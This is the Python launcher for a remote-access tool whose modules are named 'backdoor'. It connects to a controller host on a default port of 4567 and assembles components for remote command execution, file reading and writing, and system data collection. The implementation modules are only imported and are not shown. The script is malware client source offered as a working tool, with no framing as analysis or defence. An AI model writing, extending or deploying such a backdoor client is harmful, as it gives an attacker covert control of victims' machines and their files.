from argparse import ArgumentParser, Namespace
import multiprocessing

from backdoor.command.executor import RemoteCommandExecutor
from backdoor.files.io import FileReader, FileWriter
from backdoor.files.processor import FileProcessor
from backdoor.messages.exchange.client import ClientExchangeMapper
from backdoor.messages.messenger import SocketMessenger
from backdoor.messages.protocol import SocketProtocol
from backdoor.report.systemreport import SystemDataCollector
from backdoor.serialization.jsonserializer import JsonSerializer
from backdoor.client.core import Client


DEFAULT_PORT = 4567


def parse_args() -> Namespace:
    parser = ArgumentParser()
    parser.add_argument("-a", "--host", required=True)
    parser.add_argument("-p", "--port", required=False, default=DEFAULT_PORT, type=int)
    return parser.parse_args()


def create_client(host: str, port: int) -> Client:
    protocol = SocketProtocol()
    serializer = JsonSerializer()
    file_reader = FileReader()
    file_writer = FileWriter()
    data_collector = SystemDataCollector()

    messenger = SocketMessenger(protocol, serializer)
    file_processor = FileProcessor(file_writer, file_reader)
    executor = RemoteCommandExecutor(file_processor)
    exchanger = ClientExchangeMapper(messenger, executor)

    return Client(messenger, exchanger, data_collector, host, port)


def main() -> None:
    args = parse_args()

    client = create_client(args.host, args.port)

    try:
        client.run()
    except KeyboardInterrupt:
        ...


if __name__ == "__main__":
    multiprocessing.freeze_support()
    main()
